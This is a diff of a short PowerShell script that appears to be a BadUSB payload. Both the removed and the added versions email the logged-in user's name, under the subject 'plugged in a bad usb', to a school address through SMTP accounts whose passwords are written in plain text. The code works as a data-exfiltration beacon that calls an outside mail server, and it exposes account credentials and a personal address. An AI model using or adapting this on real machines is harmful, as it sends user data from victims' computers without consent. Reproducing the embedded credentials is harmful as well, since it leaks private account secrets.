@@ -1,18 +1,15 @@
-$secpasswd = ConvertTo-SecureString "gSCR7MjO8H9w" -AsPlainText -Force
-$smtpCred = (New-Object System.Management.Automation.PSCredential("psnerdattack@outlook.com", $secpasswd))
-$ToAdress = '11182@elizabethcollege.gg'
-$FromAddress = 'psnerdattack@outlook.com'
-$SmtpServer = 'smtp-mail.outlook.com'
-$SmtpPort = '587'
-
-$mailparam = @{
-	To = $ToAdress
-	From = $FromAddress
-	Subject = $env:UserName + " plugged in a bad usb"
-	Body = "<h2>User " + $env:UserName + " plugged in a bad usb!</h2>"  
-	SmtpServer = $SmtpServer
-	Port = $SmtpPort
-	Credential = $smtpCred
-}
-
-Send-MailMessage @mailparam -UseSsl
+$email = "psnerdattack@gmail.com" 
+$pass = "P@ssword01"
+$smtpServer = "smtp.gmail.com" 
+$msg = new-object Net.Mail.MailMessage 
+$smtp = new-object Net.Mail.SmtpClient($smtpServer) 
+$smtp.EnableSsl = $true 
+$msg.From = "$email"
+$msg.To.Add("11182@elizabethcollege.gg") 
+$msg.BodyEncoding = [system.Text.Encoding]::Unicode 
+$msg.SubjectEncoding = [system.Text.Encoding]::Unicode 
+$msg.IsBodyHTML = $true  
+$msg.Subject = $env:UserName + " plugged in a bad usb" 
+$msg.Body = "<h2>User " + $env:UserName + " plugged in a bad usb!</h2>"  
+$smtp.Credentials = New-Object System.Net.NetworkCredential("$email", "$pass"); 
+$smtp.Send($msg)
